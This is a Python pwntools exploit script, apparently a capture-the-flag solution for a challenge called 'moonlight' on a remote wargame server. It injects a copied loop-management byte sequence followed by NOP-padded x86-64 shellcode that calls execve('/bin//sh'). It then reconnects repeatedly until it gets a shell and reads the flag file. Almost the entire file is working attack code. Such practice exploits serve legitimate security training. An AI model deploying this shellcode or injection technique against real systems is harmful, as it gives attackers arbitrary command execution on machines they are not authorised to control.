#!/usr/bin/env python3
import warnings
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)
context.arch = 'amd64'
context.os = 'linux'

gs = '''
continue
'''

def run_program():
    if args.LOCAL:
        return process("./moonlight")
    elif args.GDB:
        return gdb.debug("./moonlight", gs)
    elif args.DOCKER:
        return remote("0", 1337)
    else:
        return remote("pwnable.co.il", 9008)

loop_mgmt = bytes([
    0x4C, 0x8b, 0x85, 0xe0, 0xfb, 0xff, 0xff,  # mov -0x420(%rbp),%r8
    0x8b, 0x84, 0x85, 0xf0, 0xfb, 0xff, 0xff,  # mov -0x410(%rbp,%rax,4),%eax
    0x83, 0xe0, 0x01,                            # and $0x1,%eax
    0x85, 0xc0,                                  # test %eax,%eax
    0x74, 0x0a,                                  # je +0x0a
    0xbf, 0x01, 0x00, 0x00, 0x00,                # mov $0x1,%edi
    0xe8, 0x20, 0xfe, 0xff, 0xff,                # call exit@plt
    0x48, 0x83, 0x85, 0xe0, 0xfb, 0xff, 0xff, 0x01,  # addq $0x1,-0x420(%rbp)
    0x48, 0x81, 0xbd, 0xe0, 0xfb, 0xff, 0xff,
    0xff, 0x00, 0x00, 0x00,                      # cmpq $0xff,-0x420(%rbp)
    0x76, 0xa5                                   # jbe -0x5b (-> 0x128a)
])

# shellcode at position 56+ (address 0x12e5+)
# execve("/bin//sh", NULL, NULL)
shellcode = asm("""
    xor eax, eax
    xor rsi, rsi
    xor rdx, rdx
    push rsi
    movabs rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    mov al, 59
    syscall
""")

# rest fill with  nops
shellcode_padded = shellcode + b"\x90" * (200 - len(shellcode))

payload = loop_mgmt + shellcode_padded

def main():
    attempt = 0
    while True:
        attempt += 1
        try:
            r = run_program()
            r.recvline()
            r.send(payload)
            sleep(0.5)
            r.sendline(b"cat flag*")
            response = r.recv(timeout=2)
            if response:
                log.success(f"Got shell on attempt {attempt}!")
                print(response.decode(errors='replace'))
                r.close()
                return
            else:
                r.close()
        except (EOFError) as e:
            log.info(f"Attempt {attempt} failed")
            r.close()

if __name__ == "__main__":
    main()
